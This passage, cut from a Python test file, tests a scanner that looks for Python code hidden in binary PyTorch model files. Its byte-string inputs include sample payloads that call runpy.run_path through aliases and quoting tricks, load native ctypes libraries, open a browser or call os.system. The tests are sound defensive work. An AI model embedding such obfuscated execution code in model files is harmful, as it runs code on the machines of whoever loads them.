            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_tail_alias_call_from_prefix_annotated_assignment_context(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b"\x00\xffimport runpy\nrun: object = runpy.run_path\n"
            + filler
            + b"def payload():\n    return run('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_tail_module_alias_from_prefix_assignment_context(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b"\x00\xffimport runpy\nrp = runpy\n" + filler + b"def payload():\n    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_tail_alias_call_from_prefix_unpack_assignment_context(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b"\x00\xffimport runpy\n(run,) = (runpy.run_path,)\n"
            + filler
            + b"def payload():\n    return run('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_tail_call_from_prefix_module_alias_context(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b"\x00\xffimport runpy\nrp = runpy\n" + filler + b"def payload():\n    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_tail_call_from_literal_true_compound_import_context(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b"\x00\xffif True: import runpy as rp\n"
            + filler
            + b"def payload():\n    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_tail_one_hop_alias_after_prefix_from_import(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b"\x00\xfffrom runpy import run_path\nrun = run_path\n"
            + filler
            + b"def payload():\n    return run('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_framed_tail_snippet_with_prefix_alias_context(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b"\x00\xffimport runpy as rp\n" + filler + b"\x00\xffdef payload():\n    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_prefix_alias_call_after_middle_tail_start(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        harmless_tail = b"".join(
            f"def harmless_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(2 * jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 4)
        )
        source = (
            b"\x00\xffimport runpy as rp\n"
            + filler
            + harmless_tail
            + b"def payload():\n    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_does_not_hoist_function_local_prefix_import_into_tail_context(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b"\x00\xffdef helper():\n"
            b"    import runpy as rp\n" + filler + b"def payload():\n"
            b"    import os\n"
            b"    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_does_not_use_commented_prefix_import_as_tail_context(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = b"\x00\xff# import runpy as rp\n" + filler + b"def payload():\n    return rp.run_path('payload.py')\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_does_not_parse_docstring_priority_import_as_statement(self) -> None:
        detector = JITScriptDetector()
        source = b'\x00\xffdef payload():\n    """\n    import os\n    """\n    return 1\n\x00MODEL-FRAMING'

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(f.type in {"dangerous_import", "code_execution_pattern"} for f in findings)

    def test_scan_model_ignores_late_priority_alias_use_inside_multiline_string_with_trigger(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"import runpy as rp\n"
            + padding
            + b'import os\ntext = """\nrp.run_path("payload.py")\n"""\n'
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_does_not_hoist_prefix_import_from_triple_quoted_string(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b'\x00\xfftext = """\nimport runpy as rp\n"""\n'
            + filler
            + b"def payload():\n    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_does_not_hoist_prefix_import_after_escaped_triple_quote(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b'\x00\xfftext = """\nnot close \\"""\nimport runpy as rp\n"""\n'
            + filler
            + b"def payload():\n    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_real_prefix_import_after_single_quoted_triple_marker(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b'\x00\xffmarker = \'"""\'\nimport runpy as rp\n'
            + filler
            + b"def payload():\n    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_tail_import_after_comment_line_closes_triple_quote(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b'\x00\xfftext = """\n# closes """\nimport runpy as rp\n'
            + filler
            + b"def payload():\n    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_restored_runpy_execution_after_static_overwrite(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"def payload():\n"
            b"    original = runpy.run_path\n"
            b"    runpy.run_path = len\n"
            b"    runpy.run_path = original\n"
            b"    return runpy.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_priority_snippets_require_import_boundaries_after_cap(self) -> None:
        def candidate(
            value: tuple[bytes, tuple[int, int]],
        ) -> tuple[bytes, tuple[int, int], tuple[tuple[int, int], ...]]:
            return value[0], value[1], (value[1],)

        leading_candidates = [
            candidate((f"import harmless_{index}\n".encode(), (index, index + 1)))
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS)
        ]
        host_candidate = candidate((b"import host_123\n", (100, 101)))
        system_candidate = candidate((b"class System:\n    pass\n", (200, 201)))
        os_candidate = candidate((b"import os\n", (300, 301)))
        aliased_runpy_candidate = candidate((b"import harmless as h, runpy as rp\n", (350, 351)))
        continued_runpy_candidate = candidate((b"import harmless as h, \\\n    runpy as rp\n", (375, 376)))
        continued_from_runpy_candidate = candidate((b"from runpy\\\n import run_path\n", (400, 401)))
        runpy_candidate = candidate((b"from runpy import run_path\n", (425, 426)))

        selected = jit_script_module._prioritized_embedded_python_snippets(
            [
                *leading_candidates,
                host_candidate,
                system_candidate,
                os_candidate,
                aliased_runpy_candidate,
                continued_runpy_candidate,
                continued_from_runpy_candidate,
                runpy_candidate,
            ]
        )

        selected_candidates = {candidate for candidate, _span, _real_ranges in selected}
        assert host_candidate[0] not in selected_candidates
        assert system_candidate[0] not in selected_candidates
        assert os_candidate[0] in selected_candidates
        assert aliased_runpy_candidate[0] in selected_candidates
        assert continued_runpy_candidate[0] in selected_candidates
        assert continued_from_runpy_candidate[0] in selected_candidates
        assert runpy_candidate[0] in selected_candidates

    def test_priority_snippets_are_budgeted_and_bounded_after_default_cap(self) -> None:
        def candidate(
            value: tuple[bytes, tuple[int, int]],
        ) -> tuple[bytes, tuple[int, int], tuple[tuple[int, int], ...]]:
            return value[0], value[1], (value[1],)

        leading_candidates = [
            candidate((f"import harmless_{index}\n".encode(), (index, index + 1)))
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS)
        ]
        priority_payload = b"import os\n" + (b"# pad\n" * 4000)
        priority_candidates = [
            candidate(
                (
                    priority_payload,
                    (
                        1_000 + index * len(priority_payload),
                        1_000 + (index + 1) * len(priority_payload),
                    ),
                )
            )
            for index in range(jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPETS + 4)
        ]

        selected = jit_script_module._prioritized_embedded_python_snippets([*leading_candidates, *priority_candidates])

        assert len(selected) == (
            jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS
            + jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPETS
        )
        priority_selected = selected[jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS :]
        assert all(
            len(candidate) <= jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES
            for candidate, _span, _real_ranges in priority_selected
        )

    def test_scan_model_ignores_binary_framed_top_level_replaced_runpy_execution(self) -> None:
        detector = JITScriptDetector()
        source = b"\x00\xffimport runpy\nrunpy.run_path = len\nrunpy.run_path([])\n\x00MODEL-FRAMING"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_binary_framed_long_tail_alias_aware_runpy_execution(self) -> None:
        detector = JITScriptDetector()
        tail = b"\n".join(b"tail" for _ in range(jit_script_module._MAX_SNIPPET_PARSE_TRIM_ATTEMPTS + 20))
        source = (
            b"\x00\xffdef payload():\n    from runpy import run_path as run\n    return run('payload.py')\n\x00" + tail
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_ignores_binary_prefixed_replaced_runpy_execution(self) -> None:
        detector = JITScriptDetector()
        source = b"\x00\xffdef payload():\n    import runpy\n    runpy.run_path = len\n    return runpy.run_path([])\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert findings == []

    def test_scan_model_ignores_lossy_decoded_string_literal_runpy_execution(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    # ignored invalid bytes: "
            + (b"\xff" * 64)
            + b"\n    return \"runpy.run_path('payload.py')\"\n\x00\xffMODEL-FRAMING"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_ignores_framed_runpy_call_inside_multiline_literal(self) -> None:
        detector = JITScriptDetector()
        source = b"\x00\xffimport runpy as rp\npayload = '''\n\x00\xff((rp).run_path)('safe')\n'''\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_preserves_raw_runpy_match_after_benign_parsed_snippet(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"def benign():\n"
            b"    return \"runpy.run_path('payload.py')\"\n"
            b"}\n"
            b"def payload():\n"
            b"if True print('broken')\n"
            b"runpy.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_binary_framed_webbrowser_and_ctypes_calls(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    import builtins\n"
            b"    import ctypes\n"
            b"    import os\n"
            b"    import webbrowser\n"
            b"    webbrowser.get().open.__call__('https://example.invalid')\n"
            b"    webbrowser.get().__getattribute__('open')('https://example.invalid')\n"
            b"    ctypes.windll.kernel32\n"
            b"    ctypes.cdll['msvcrt'].printf(b'x')\n"
            b"    ctypes.cdll.__getitem__('msvcrt')\n"
            b"    loader = ctypes.LibraryLoader(ctypes.CDLL)\n"
            b"    loader_kw = ctypes.LibraryLoader(dlltype=ctypes.CDLL)\n"
            b"    loader_alias = ctypes.LibraryLoader(ctypes.cdll._dlltype)\n"
            b"    loader_method = ctypes.LibraryLoader(ctypes.CDLL)\n"
            b"    loader.msvcrt.printf(b'x')\n"
            b"    loader_kw.payload.printf(b'x')\n"
            b"    loader_alias.aliaslib.printf(b'x')\n"
            b"    loader_method.LoadLibrary('methodlib')\n"
            b"    loader_method.__getitem__('getitemlib')\n"
            b"    loader_method.LoadLibrary(name='keywordlib')\n"
            b"    loader_method.__getitem__(name='keywordgetitem')\n"
            b"    loader_variable = ctypes.LibraryLoader(ctypes.CDLL)\n"
            b"    library_name = 'variablelib'\n"
            b"    loader_variable.LoadLibrary(library_name)\n"
            b"    loader_variable.__getitem__(library_name)\n"
            b"    ctypes.LibraryLoader.LoadLibrary(ctypes.cdll, 'unboundlib')\n"
            b"    ctypes.LibraryLoader.__getitem__(ctypes.cdll, 'unboundgetitem')\n"
            b"    ctypes.LibraryLoader.LoadLibrary(self=ctypes.cdll, name='selfkeywordlib')\n"
            b"    ctypes.LibraryLoader.__getitem__(self=ctypes.cdll, name='selfkeywordgetitem')\n"
            b"    object.__getattribute__(ctypes.cdll, 'LoadLibrary')('objectmethodlib')\n"
            b"    object.__getattribute__(ctypes.cdll, '__getitem__')('objectgetitem')\n"
            b"    ctypes.windll.kernel32 = len\n"
            b"    ctypes.windll.__getattr__('kernel32')\n"
            b"    loader_conditional = ctypes.LibraryLoader(ctypes.CDLL)\n"
            b"    conditional_load = loader_conditional.LoadLibrary\n"
            b"    if flag:\n"
            b"        conditional_load = ctypes.LibraryLoader\n"
            b"    conditional_load('conditionalmethod')\n"
            b"    ctypes.cdll.augmented += 1\n"
            b"    loader_augmented = ctypes.LibraryLoader(ctypes.CDLL)\n"
            b"    loader_augmented.augmented += 1\n"
            b"    class MyCDLL(ctypes.CDLL):\n"
            b"        pass\n"
            b"    ctypes.LibraryLoader(MyCDLL).subclasslib\n"
            b"    getattr(ctypes.windll, 'user32')\n"
            b"    ctypes.windll.__getattr__('advapi32')\n"
            b"    ctypes.cdll.__getattr__(name='keywordgetattr')\n"
            b"    ctypes.LibraryLoader(*(ctypes.CDLL,)).unpacklib\n"
            b"    class SafeBase:\n"
            b"        def __init__(self, name: str) -> None:\n"
            b"            self.name = name\n"
            b"    class ExplicitSuperCDLL(SafeBase, ctypes.CDLL):\n"
            b"        def __init__(self, name: str) -> None:\n"
            b"            super(SafeBase, self).__init__(name)\n"
            b"    ctypes.LibraryLoader(ExplicitSuperCDLL).superlib\n"
            b"    return getattr(ctypes.LibraryLoader(ctypes.CDLL), 'attrlib')\n"
            b"\x00MODEL-FRAMING"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        patterns = {finding.pattern for finding in findings if finding.type == "code_execution_pattern"}
        assert "Web browser launch detected" in patterns
        assert "Native library loading detected" in patterns

    def test_scan_model_preserves_dynamic_member_risk_after_conditional_overwrite(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    import ctypes\n"
            b"    import webbrowser\n"
            b"    browser = webbrowser.get()\n"
            b"    if replace:\n"
            b"        browser.open = len\n"
            b"        ctypes.windll.kernel32 = len\n"
            b"    browser.open('https://example.invalid')\n"
            b"    return ctypes.windll.kernel32\n"
            b"\x00MODEL-FRAMING"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        patterns = {finding.pattern for finding in findings if finding.type == "code_execution_pattern"}
        assert "Web browser launch detected" in patterns
        assert "Native library loading detected" in patterns

    def test_scan_model_keeps_webbrowser_member_overwrites_controller_local(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    import webbrowser\n"
            b"    safe_browser = webbrowser.get('safe')\n"
            b"    safe_browser.open = len\n"
            b"    other_browser = webbrowser.get('other')\n"
            b"    return other_browser.open('https://example.invalid')\n"
            b"\x00MODEL-FRAMING"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    def test_scan_model_keeps_library_loader_member_overwrites_instance_local(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    import ctypes\n"
            b"    safe_loader = ctypes.LibraryLoader(ctypes.CDLL)\n"
            b"    safe_loader.payload = len\n"
            b"    other_loader = ctypes.LibraryLoader(ctypes.CDLL)\n"
            b"    return other_loader.payload\n"
            b"\x00MODEL-FRAMING"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Native library loading detected"
            for finding in findings
        )

    def test_scan_model_detects_hasattr_ctypes_load_and_local_init_alias(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    import ctypes\n"
            b"    hasattr(ctypes.cdll, 'hasattrlib')\n"
            b"    hasattr(ctypes.LibraryLoader(ctypes.CDLL), 'hasattrpayload')\n"
            b"    ctypes.cdll.__getattr__(name='keywordgetattr')\n"
            b"    ctypes.LibraryLoader(*(ctypes.CDLL,)).starredlib\n"
            b"    class LocalAliasCDLL(ctypes.CDLL):\n"
            b"        def __init__(self, name: str) -> None:\n"
            b"            init = ctypes.CDLL.__init__\n"
            b"            init(self, name)\n"
            b"    ctypes.LibraryLoader(LocalAliasCDLL).localaliaslib\n"
            b"    class Safe:\n"
            b"        def __init__(self, name: str) -> None:\n"
            b"            self.name = name\n"
            b"    class SkipSafeCDLL(Safe, ctypes.CDLL):\n"
            b"        def __init__(self, name: str) -> None:\n"
            b"            super(Safe, self).__init__(name)\n"
            b"    ctypes.LibraryLoader(SkipSafeCDLL).superskiplib\n"
            b"    class ClassBodyInitCDLL(Safe, ctypes.CDLL):\n"
            b"        __init__ = ctypes.CDLL.__init__\n"
            b"    ctypes.LibraryLoader(ClassBodyInitCDLL).classbodyinitlib\n"
            b"\x00MODEL-FRAMING"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Native library loading detected"
            for finding in findings
        )

    def test_scan_model_preserves_dynamic_member_risk_after_reassignment_and_delete(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    import ctypes\n"
            b"    import webbrowser\n"
            b"    browser = webbrowser.get('safe')\n"
            b"    browser.open = len\n"
            b"    browser = webbrowser.get('other')\n"
            b"    browser.open('https://example.invalid')\n"
            b"    other = webbrowser.get()\n"
            b"    other.open = len\n"
            b"    del other.open\n"
            b"    other.open('https://example.invalid')\n"
            b"    loader = ctypes.LibraryLoader(ctypes.CDLL)\n"
            b"    loader.payload = len\n"
            b"    loader = ctypes.LibraryLoader(ctypes.CDLL)\n"
            b"    loader.payload\n"
            b"    other_loader = ctypes.LibraryLoader(ctypes.CDLL)\n"
            b"    other_loader.payload = len\n"
            b"    del other_loader.payload\n"
            b"    other_loader.payload\n"
            b"    ctypes.windll.payload = len\n"
            b"    del ctypes.windll.payload\n"
            b"    return ctypes.windll.payload\n"
            b"\x00MODEL-FRAMING"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        patterns = {finding.pattern for finding in findings if finding.type == "code_execution_pattern"}
        assert "Web browser launch detected" in patterns
        assert "Native library loading detected" in patterns

    def test_scan_model_detects_ctypes_cdll_subclass_class_local_initializer_alias(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    import ctypes\n"
            b"    class MyCDLL(ctypes.CDLL):\n"
            b"        init = ctypes.CDLL.__init__\n"
            b"        def __init__(self, name: str) -> None:\n"
            b"            self.init(name)\n"
            b"    return ctypes.LibraryLoader(MyCDLL).payload\n"
            b"\x00MODEL-FRAMING"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Native library loading detected"
            for finding in findings
        )

    def test_scan_model_ignores_unreachable_ctypes_cdll_subclass_initializer(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    import ctypes\n"
            b"    class SafeCDLL(ctypes.CDLL):\n"
            b"        def __init__(self, name: str) -> None:\n"
            b"            if False:\n"
            b"                super().__init__(name)\n"
            b"    return ctypes.LibraryLoader(SafeCDLL).payload\n"
            b"\x00MODEL-FRAMING"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Native library loading detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        ("payload", "expected_pattern"),
        [
            (
                b"def payload():\n    import webbrowser as wb\n    return wb.open('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"def payload():\n    import ctypes as ct\n    return ct.CDLL('libpayload.so')\n",
                "Native library loading detected",
            ),
        ],
    )
    def test_scan_model_detects_late_priority_webbrowser_and_ctypes_aliases(
        self, payload: bytes, expected_pattern: str
    ) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        source = b"\x00\xff" + leading_blocks + payload

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(f.type == "code_execution_pattern" and f.pattern == expected_pattern for f in findings)

    def test_scan_model_ignores_safe_webbrowser_get_overwrite(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    import webbrowser\n"
            b"    webbrowser.get = len\n"
            b"    return webbrowser.get([]).open('https://example.invalid')\n"
            b"\x00MODEL-FRAMING"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    def test_scan_model_ignores_non_loading_ctypes_subclass_initializers(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    import ctypes\n"
            b"    class Safe:\n"
            b"        def __init__(self, name: str) -> None:\n"
            b"            self.name = name\n"
            b"    class NoLoad(Safe, ctypes.CDLL):\n"
            b"        pass\n"
            b"    ctypes.LibraryLoader(NoLoad).payload\n"
            b"    NoLoad('/missing')\n"
            b"    class MissingNameSuperCDLL(ctypes.CDLL):\n"
            b"        def __init__(self, name: str) -> None:\n"
            b"            super().__init__()\n"
            b"    ctypes.LibraryLoader(MissingNameSuperCDLL).payload\n"
            b"    MissingNameSuperCDLL('/missing')\n"
            b"    class DeadDelegateCDLL(ctypes.CDLL):\n"
            b"        def __init__(self, name: str) -> None:\n"
            b"            if False:\n"
            b"                ctypes.CDLL.__init__(self, name)\n"
            b"    ctypes.LibraryLoader(DeadDelegateCDLL).payload\n"
            b"    DeadDelegateCDLL('/missing')\n"
            b"    class InstanceShadowCDLL(ctypes.CDLL):\n"
            b"        init = ctypes.CDLL.__init__\n"
            b"        def __init__(self, name: str) -> None:\n"
            b"            self.init = lambda name: None\n"
            b"            self.init(name)\n"
            b"    ctypes.LibraryLoader(InstanceShadowCDLL).payload\n"
            b"    InstanceShadowCDLL('/missing')\n"
            b"    class NewSkipsInitCDLL(ctypes.CDLL):\n"
            b"        def __new__(cls, name: str):\n"
            b"            return object()\n"
            b"    ctypes.LibraryLoader(NewSkipsInitCDLL).payload\n"
            b"    NewSkipsInitCDLL('/missing')\n"
            b"\x00MODEL-FRAMING"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Native library loading detected"
            for finding in findings
        )

    def test_scan_model_ignores_safe_webbrowser_method_overwrite_and_invalid_libraryloader(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    import ctypes\n"
            b"    import webbrowser\n"
            b"    browser = webbrowser.get()\n"
            b"    browser.open = len\n"
            b"    browser.open([])\n"
            b"    loader = ctypes.LibraryLoader(len)\n"
            b"    loader.payload.printf(b'x')\n"
            b"    load = ctypes.cdll.LoadLibrary\n"
            b"    class_attr = ctypes.LibraryLoader.payload\n"
            b"    ctypes.windll.kernel32 = len\n"
            b"    getattr(ctypes.windll, 'kernel32')\n"
            b"    getattr(object=ctypes.cdll, name='msvcrt')\n"
            b"    ctypes.windll.kernel32\n"
            b"    ctypes.cdll.__getattribute__('msvcrt')\n"
            b"    object.__getattribute__(ctypes.cdll, 'msvcrt')\n"
            b"    os.__getattr__('system')('id')\n"
            b"    builtins.__getattr__('eval')('1')\n"
            b"    other = browser\n"
            b"    browser.open = len\n"
            b"    browser = webbrowser.get()\n"
            b"    other.open([])\n"
            b"    other_loader = loader\n"
            b"    loader.payload = len\n"
            b"    loader = ctypes.LibraryLoader(ctypes.CDLL)\n"
            b"    other_loader.payload([])\n"
            b"    ctypes.LibraryLoader = len\n"
            b"    ctypes.LibraryLoader(ctypes.CDLL).payload\n"
            b"    class SafeCDLL(ctypes.CDLL):\n"
            b"        def __init__(self, name: str) -> None:\n"
            b"            pass\n"
            b"    ctypes.LibraryLoader(SafeCDLL).payload\n"
            b"    SafeCDLL('/missing')\n"
            b"    class Safe:\n"
            b"        def __init__(self, name: str) -> None:\n"
            b"            self.name = name\n"
            b"    class NoLoad(Safe, ctypes.CDLL):\n"
            b"        def __init__(self, name: str) -> None:\n"
            b"            super().__init__(name)\n"
            b"    ctypes.LibraryLoader(NoLoad).payload\n"
            b"    NoLoad('/missing')\n"
            b"    class OverwrittenInitCDLL(ctypes.CDLL):\n"
            b"        init = ctypes.CDLL.__init__\n"
            b"        def init(self, name: str) -> None:\n"
            b"            pass\n"
            b"        def __init__(self, name: str) -> None:\n"
            b"            self.init(name)\n"
            b"    ctypes.LibraryLoader(OverwrittenInitCDLL).payload\n"
            b"    OverwrittenInitCDLL('/missing')\n"
            b"    class SafeNestedCDLL(ctypes.CDLL):\n"
            b"        def __init__(self, name: str) -> None:\n"
            b"            def later() -> None:\n"
            b"                ctypes.CDLL.__init__(self, name)\n"
            b"    ctypes.LibraryLoader(SafeNestedCDLL).payload\n"
            b"    SafeNestedCDLL('/missing')\n"
            b"    class SafeShadowCDLL(ctypes.CDLL):\n"
            b"        init = ctypes.CDLL.__init__\n"
